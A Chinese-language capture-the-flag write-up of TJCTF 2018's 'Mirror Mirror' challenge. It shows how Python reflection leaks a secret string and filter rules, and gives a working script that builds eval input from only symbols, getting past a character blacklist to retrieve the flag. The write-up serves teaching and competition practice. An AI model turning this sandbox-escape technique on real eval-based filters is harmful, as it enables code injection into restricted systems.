---
mathjax: true
title:  TJCTF2018：Mirror Mirror——一种绕过Python沙箱字符限制的方法
date: 2018-08-14 19:24:11
---

![1534248479004](1534248479004.png)

通过nc连接`problem1.tjctf.org:8004` ,题目提供一个Python交互终端。

根据题目描述 Reflection 可知与Python反射机制有关。

所谓反射机制就是能够通过向函数传入字符串参数，来操纵指定对象的类型、属性、方法和类。

> A Python script can find out about the type, class, attributes and methods of an object. This is referred to as **reflection** or **introspection**. See also [Metaclasses](https://en.wikibooks.org/wiki/Python_Programming/Metaclasses).
>
> Reflection-enabling functions include type(), isinstance(), callable(), dir() and getattr().
>
> —— https://en.wikibooks.org/wiki/Python_Programming/Reflection 

这里使用`dir()` 函数查看`get_flag` 的属性。

```python
λ nc problem1.tjctf.org 8004
Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!
>>> get_flag()
Traceback (most recent call last):
  File "<console>", line 1, in <module>
TypeError: get_flag() takes exactly 1 argument (0 given)
>>> get_flag('1')
1 is not a valid character
>>> get_flag('@')
Traceback (most recent call last):
  File "<console>", line 1, in <module>
  File "/home/app/problem.py", line 23, in get_flag
    if(eval(input) == super_secret_string):
  File "<string>", line 1
    @
    ^
SyntaxError: unexpected EOF while parsing
>>> dir(get_flag)
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
>>> dir(get_flag.func_code)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
>>> get_flag.func_code.co_consts
(None, 'this_is_the_super_secret_string', 48, 57, 65, 90, 97, 122, 44, 95, ' is not a valid character', '%\xcb', "You didn't guess the value of my super_secret_string")
>>>
```



探索后猜测要求向`get_flag()` 函数传入一个字符串，eval执行后等于super_secret_string就会返回flag。

`48, 57, 65, 90, 97, 122, 44, 95` 应该意味着ASCII值为 48~57，65~90，97~122，44和95的字符不被允许，也就是 `[a-zA-Z0-9,_]` 被禁用了，测试一下发现确实如此。此外 `'%\xcb'` 字符串也是一个提示。

这题应该是对 [A python's escape from PlaidCTF jail](https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/) 的复现。主要目标是通过有限的字符 集 `({[<'":~%c>]}) ` 构造出任意的字符串。主要思路如下：

- `[]<{}` 逻辑值为True，等价于1；`[]<[]` 逻辑值为False，等价于0。

- 由1和0，结合按位取反`~` 和移位 `<<` 可以得到任意整数。

  ```python
  def brainfuckize(nb):
      if nb in [-2, -1, 0, 1]:
          return ["~({}<[])", "~([]<[])", "([]<[])", "({}<[])"][nb + 2]
      if nb % 2:
          return "~%s" % brainfuckize(~nb)
      else:
          return "(%s<<({}<[]))" % brainfuckize(nb / 2)
  
  
  def f(n):
      # 实际上这个函数就足够了，但生成的结果长度会比第一个长很多。
      if n == 0:
          return "([]<[])"
      return "~%s" % f(~n) if n % 2 else "(%s<<({}<[]))" % f(n / 2)
  
  
  print f(5), eval(brainfuckize(5)) == 5
  # ~(~(~(~([]<[])<<({}<[]))<<({}<[]))<<({}<[])) True
  ```

- 字符串 `%\xcb` 由`%` 和 `\xcb)` 两个字符构成。`repr('%\xcb')` 会得到一个七字符的字符串，其中包含`%` 和 `c` 。结合上面的得到的整数就可以构造任意字符了。

  ```python
  >>> for i in repr('%\xcb'):
  ...     print i,
  ...
  ' % \ x c b '
  >>> for i in `'%\xcb'`:
  ...     print i,
  ...
  ' % \ x c b '
  
  >>> `'%\xcb'`[1::3]
  '%c'
  >>> `'%\xcb'`[1::3]%97 == chr(97)
  True
  >>>
  ```

  在Python2 中 ，反引号包裹是 `repr()` 的快捷方式，效果完全一致。在Python3中反引号被废除了。

- 接下来就可以构造任意字符串并传给`get_flag()`了。

  ```python
  def bf(nb):
      if nb in [-2, -1, 0, 1]:
          return ["~({}<[])", "~([]<[])", "([]<[])", "({}<[])"][nb + 2]
      if nb % 2:
          return "~%s" % bf(~nb)
      else:
          return "(%s<<({}<[]))" % bf(nb / 2)
  
  
  def gen_single_char(c):
      return "`'%\\xcb'`[" + bf(1) + "::" + bf(3) + "]%(" + bf(ord(c)) + ")"
  
  
  secret = "this_is_the_super_secret_string"
  cmd = 'get_flag("%s")' % ('+'.join(gen_single_char(i) for i in secret))
  print cmd
  # tjctf{wh0_kn3w_pyth0n_w4s_s0_sl1pp3ry}
  ```

![1534253889627](1534253889627.png)